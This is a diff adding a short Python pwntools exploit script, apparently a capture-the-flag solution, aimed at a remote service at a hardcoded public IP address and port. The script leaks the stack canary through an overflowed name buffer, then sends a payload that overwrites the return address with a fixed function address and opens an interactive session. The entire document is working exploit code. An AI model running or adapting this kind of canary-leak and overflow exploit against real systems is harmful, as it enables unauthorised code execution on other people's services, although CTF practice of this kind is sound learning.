@@ -1,0 +1,15 @@
+from pwn import *
+
+#s = remote('192.168.33.10',1234)
+s= remote('110.10.147.29', 8282)
+s.recvuntil('name?')
+s.send('A'*0x19)
+s.recvuntil('with?')
+s.sendline('2')
+canary = u64("\x00"+s.recvuntil('bet?')[0x1e:0x1e+7])
+print hex(canary)
+s.sendline('-2')
+s.recvuntil(':')
+s.sendline('h'*0x28)
+s.sendline("A"*0x28+p64(canary)*2+p64(0x004008F6 ))
+s.interactive()
